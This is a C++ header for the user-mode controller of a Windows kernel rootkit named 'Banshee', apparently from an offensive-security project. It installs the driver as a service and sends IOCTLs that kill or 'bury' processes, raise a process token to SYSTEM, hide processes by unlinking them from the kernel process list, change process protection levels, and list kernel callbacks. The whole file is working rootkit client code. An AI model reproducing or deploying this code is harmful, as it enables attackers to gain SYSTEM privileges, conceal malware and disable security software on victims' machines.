#pragma once

#include <Windows.h>
#include <string>
#include <filesystem>
#include <codecvt>
#include <locale>

#define MAX_BURY_ARG_LENGTH 256

// --------------------------------------------------------------------------------------------------------
// IOCTLs 

#define BE_IOCTL_TEST_DRIVER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_KILL_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_PROTECT_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
    ULONG pid;
    BYTE newProtectionLevel;
} IOCTL_PROTECT_PROCESS_PAYLOAD;

#define BE_IOCTL_BURY_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_ELEVATE_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)


#define BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define BE_IOCTL_ENUMERATE_THREAD_CALLBACKS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)

enum CALLBACK_TYPE {
    CreateProcessNotifyRoutine = 0,
    CreateThreadNotifyRoutine = 1
};

typedef struct _CALLBACK_DATA {
    UINT64 driverBase;
    UINT64 offset;
    WCHAR driverName[64];
} CALLBACK_DATA;

// --------------------------------------------------------------------------------------------------------

enum BANSHEE_STATUS 
{
    BE_SUCCESS = 0,
    BE_ERR_DRIVER_NOT_EXISTS = 1,
    BE_ERR_FAILED_TO_INSTALL = 2,
    BE_ERR_FAILED_TO_INITIALIZE = 3,
    BE_ERR_IOCTL = 4,
    BE_ERR_GENERIC = 5,
};

// Protection Levels - Windows Internals Part 1 - Page 115 (7th english edition)
BYTE PS_PROTECTED_SYSTEM = 0x72; // Geschützt WinSystem
BYTE PS_PROTECTED_WULONGCB = 0x62; // Geschützt WinTcb
BYTE PS_PROTECTED_WULONGCB_LIGHT = 0x61; // PPL WinTcb
BYTE PS_PROTECTED_WINDOWS = 0x52; // Geschützt Windows
BYTE PS_PROTECTED_WINDOWS_LIGHT = 0x51; // PPL Windows
BYTE PS_PROTECTED_LSA_LIGHT = 0x41; // PPL Lsa
BYTE PS_PROTECTED_ANTIMALWARE_LIGHT = 0x31; // PPL Anti - malware
BYTE PS_PROTECTED_AUTHENTICODE = 0x21; // Geschützt Authenticode
BYTE PS_PROTECTED_AUTHENTICODE_LIGHT = 0x11; // PPL Authenticode
BYTE PS_PROTECTED_NONE = 0x00; // Keine Keine

// --------------------------------------------------------------------------------------------------------

class Banshee 
{
private:
    const std::string serviceName = "Banshee";
    const std::string serviceDescription = "Banshee Rootkit";
    const std::string deviceName = "\\\\.\\Banshee";

    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    HANDLE hDevice = NULL; 
    std::string driverPath;

public:
	Banshee()
	{
        
	}

    ~Banshee()
    {
        this->Unload();
    }

    /**
     * Installs the Banshee driver.
     *
     * @param driverPath Path of the Banshee.sys driver
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS 
    Install(const std::string& driverPath)
    {
        this->driverPath = driverPath;

        if (!std::filesystem::exists(this->driverPath))
        {
            return BE_ERR_DRIVER_NOT_EXISTS;
        }

        if (!this->InstallDriver(this->driverPath))
        {
            return BE_ERR_FAILED_TO_INSTALL;
        }

        return BE_SUCCESS;
    }

    /**
     * Initializes the Banshee driver by starting the service.
     *
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS 
    Initialize()
    {
        if (!this->StartDriver())
        {
            return BE_ERR_FAILED_TO_INITIALIZE;
        }
        return BE_SUCCESS;
    }

    /**
     * Stops and deletes the driver and closes all handles.
     *
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS
    Unload()
    {
        // Close device handle
        if (this->hDevice)
        {
            CloseHandle(this->hDevice);
        }

        if (this->hService)
        {
            // Delete the service
            DeleteService(this->hService);

            // Stop the service
            SERVICE_STATUS ss;
            ControlService(this->hService, SERVICE_CONTROL_STOP, &ss);

            // Close handle
            CloseServiceHandle(this->hService);
        }

        // Close service manager handle
        if (this->hSCManager)
        {
            CloseServiceHandle(this->hSCManager);
        }

        return BE_SUCCESS;
    }

    /**
     * Dispatches IOCTL to terminate process by PID.
     *
     * @param targetPid PID of the target process
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS 
    IoCtlKillProcess(const DWORD& targetPid) const
    {
        DWORD dwBytesReturned = 0;
        DWORD outBuf = 0;

        BOOL success = DeviceIoControl(
            this->hDevice,
            BE_IOCTL_KILL_PROCESS,
            (LPVOID)&targetPid, sizeof(DWORD),
            (LPVOID)&outBuf, sizeof(DWORD),
            &dwBytesReturned, NULL
        );

        if (!success)
        {
            return BE_ERR_IOCTL;
        }

        return BE_SUCCESS;
    }

    /**
    * Dispatches IOCTL to "bury" a process (stop it from recreating by adding a callback on process creation).
    *
    * @return BANSHEE_STATUS status code.
    */
    BANSHEE_STATUS
    IoCtlBuryProcess(const std::string& processToBury) const
    {
        DWORD dwBytesReturned = 0;

        // Convert to wchar*
        INT wchars_num = MultiByteToWideChar(CP_UTF8, 0, processToBury.c_str(), -1, NULL, 0);
        wchar_t* wsProcessToBury = new wchar_t[wchars_num];
        MultiByteToWideChar(CP_UTF8, 0, processToBury.c_str(), -1, wsProcessToBury, wchars_num);
  
        BOOL success = DeviceIoControl(
            this->hDevice,
            BE_IOCTL_BURY_PROCESS,
            (LPVOID)wsProcessToBury, ((DWORD)(wcslen(wsProcessToBury) + 1)) * sizeof(WCHAR),
            NULL, 0,
            &dwBytesReturned, NULL
        );

        if (!success)
        {
            delete[] wsProcessToBury;
            return BE_ERR_IOCTL;
        }

        delete[] wsProcessToBury;
        return BE_SUCCESS;
    }

    /**
     * Dispatches IOCTL to change the access token of a process to SYSTEM
     *
     * @param targetPid PID of the target process
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS
    IoCtlElevateProcessAccessToken(const DWORD& targetPid) const
    {
        DWORD dwBytesReturned = 0;

        BOOL success = DeviceIoControl(
            this->hDevice,
            BE_IOCTL_ELEVATE_TOKEN,
            (LPVOID)&targetPid, sizeof(DWORD),
            NULL, 0,
            &dwBytesReturned, NULL
        );

        if (!success)
        {
            return BE_ERR_IOCTL;
        }

        return BE_SUCCESS;
    }

    /**
     * Dispatches IOCTL to hide a process by PID by removing it from the active process doubly linked list.
     *
     * @param targetPid PID of the target process
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS
    IoCtlHideProcess(const DWORD& targetPid) const
    {
        DWORD dwBytesReturned = 0;

        BOOL success = DeviceIoControl(
            this->hDevice,
            BE_IOCTL_HIDE_PROCESS,
            (LPVOID)&targetPid, sizeof(DWORD),
            NULL, 0,
            &dwBytesReturned, NULL
        );

        if (!success)
        {
            return BE_ERR_IOCTL;
        }

        return BE_SUCCESS;
    }

    /**
     * Dispatches IOCTL to change the protection level of a process by directly modifying the EPROCESS structure
     *
     * @param targetPid PID of the target process
     * @param newProtectionLevel Target protection level to set on the process
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS 
    IoCtlProtectProcess(const DWORD& targetPid, const BYTE& newProtectionLevel) const
    {
        IOCTL_PROTECT_PROCESS_PAYLOAD payload = {
            targetPid,
            newProtectionLevel
        };
        DWORD dwBytesReturned = 0;

        BOOL success = DeviceIoControl(
            this->hDevice,
            BE_IOCTL_PROTECT_PROCESS,
            (LPVOID)&payload, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD),
            NULL, 0,
            &dwBytesReturned, NULL
        );

        if (!success)
        {
            return BE_ERR_IOCTL;
        }

        return BE_SUCCESS;
    }

    /**
     * Dispatches IOCTL to test driver functionality
     *
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS
    IoCtlTestDriver() const
    {
        // Send a 7, receive a 6
        DWORD dwBytesReturned = 0;
        DWORD outBuf = 0;
        DWORD iInput = 7;

        BOOL success = DeviceIoControl(
            this->hDevice,
            BE_IOCTL_TEST_DRIVER,
            (LPVOID)&iInput, sizeof(DWORD),
            (LPVOID)&outBuf, sizeof(DWORD),
            &dwBytesReturned, NULL
        );

        if (!success)
        {
            return BE_ERR_IOCTL;
        }

        return BE_SUCCESS;
    }

    /**
     * Dispatches IOCTL to enumerate kernel callbacks
     *
     * @param type Type of kernel callback to resolve
     * @param dataOut Vector for the output data
     * @return BANSHEE_STATUS status code.
     */
    BANSHEE_STATUS
    IoCtlEnumerateCallbacks(const CALLBACK_TYPE& type, std::vector<CALLBACK_DATA>& dataOut)
    {
        DWORD dwBytesReturned = 0;
        auto outBuf = new CALLBACK_DATA[16]; // TODO: max number of kernel callbacks
        RtlSecureZeroMemory(outBuf, sizeof(CALLBACK_DATA) * 16);
#
        ULONG IOCTL;
        switch (type) 
        {
        case CreateProcessNotifyRoutine:
            IOCTL = BE_IOCTL_ENUMERATE_PROCESS_CALLBACKS;
            break;
        case CreateThreadNotifyRoutine:
            IOCTL = BE_IOCTL_ENUMERATE_THREAD_CALLBACKS;
            break;
        default:
            return BE_ERR_GENERIC;
            break;
        }

        BOOL success = DeviceIoControl(
            this->hDevice,
            IOCTL,
            (LPVOID)outBuf, sizeof(CALLBACK_DATA) * 16, // TODO: max amount of callbacks as constant
            (LPVOID)outBuf, sizeof(CALLBACK_DATA) * 16,
            &dwBytesReturned, NULL
        );

        if (!success)
        {
            delete[] outBuf;
            return BE_ERR_IOCTL;
        }

        for (INT i = 0; i < dwBytesReturned / sizeof(CALLBACK_DATA); ++i)
        {
            dataOut.push_back(outBuf[i]);
        }

        delete[] outBuf;
        return BE_SUCCESS;
    }

private:
    bool InstallDriver(const std::string& driverPath)
    {
        // Prevent handle leaks
        if (!this->hSCManager)
        {
            this->hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
            if (!hSCManager)
            {
                return false;
            }
        }

        // Prevent handle leaks
        if (!this->hService)
        {
            this->hService = CreateServiceA(
                hSCManager,
                this->serviceName.c_str(),
                this->serviceDescription.c_str(),
                SERVICE_START | DELETE | SERVICE_STOP,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START, // do not start on boot
                SERVICE_ERROR_IGNORE,
                driverPath.c_str(),
                NULL, NULL, NULL, NULL, NULL
            );

            if (!this->hService && GetLastError() != 1073) // Already exists
            {
                return false;
            }
        }

        return true;
    }

    bool StartDriver()
    {
        // Prevent handle leaks
        if (!this->hSCManager)
        {
            this->hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
            if (!hSCManager)
            {
                return false;
            }
        }

        // Prevent handle leaks
        if (!this->hService)
        {
            this->hService = OpenServiceA(
                this->hSCManager,
                this->serviceName.c_str(),
                SERVICE_START | DELETE | SERVICE_STOP
            );
            if (!this->hService)
            {
                return false;
            }
        }

        if (StartService(this->hService, 0, NULL) == 0)
        {
            if (GetLastError() != 1056) // Already running
            {
                return false;
            }
        }

        // Prevent handle leaks
        if (!this->hDevice)
        {
            this->hDevice = CreateFileA(this->deviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
            if (!this->hDevice)
            {
                return false;
            }
        }
        

        return true;
    }
};